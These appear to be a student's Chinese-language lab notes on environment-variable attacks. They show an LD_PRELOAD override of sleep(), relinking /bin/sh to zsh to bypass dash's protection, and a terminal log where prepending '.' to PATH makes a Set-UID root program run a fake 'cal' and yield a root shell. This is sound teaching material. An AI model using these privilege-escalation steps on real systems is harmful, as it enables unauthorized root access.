# 第二章实验

## 实验1 介绍环境变量

environ.c 程序可以打印进程中所有的环境变量


## 通过动态连接进行的攻击

mytest.c 是一个调用了 sleep()函数的程序，但可通过将sleep.c编译成动态链接库，并export到LD_PRELOAD从而使mytest程序不能正常运行


	使mytest成为Set-UID程序之后，会发现在保护机制的保护下仍可正常运行


```sh
	$ gcc -c sleep.c
	$ gcc -shared -o libmylib.so.1.0.1 sleep.o
	$ export LD_PRELOAD=./libmylib.so.1.0.1
```

## 通过外部程序进行的攻击

	由于dash的保护措施，将/bin/sh指向/bin/zsh来保证实验效果

` $ sudo ln -sf /bin/zsh /bin/sh `


实验结束后记得使用 ` $ sudo ln -sf /bin/dash /bin/sh `将sh改回来

```sh
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ gcc -o vul vul.c
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ sudo chown root vul
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ sudo chmod 4755 vul
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ ./vul 
      十二月 2020        
日 一 二 三 四 五 六  
       1  2  3  4  5  
 6  7  8  9 10 11 12  
13 14 15 16 17 18 19  
20 21 22 23 24 25 26  
27 28 29 30 31        
                    
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ gcc -o cal cal_attack_vul.c 
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ export PATH=.:$PATH
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
yuan@ubuntu:~/learningNotes/Lab/Cap2_env$ ./vul 
bash-4.4# id
uid=1000(yuan) gid=1000(yuan) euid=0(root) 组=1000(yuan)
```
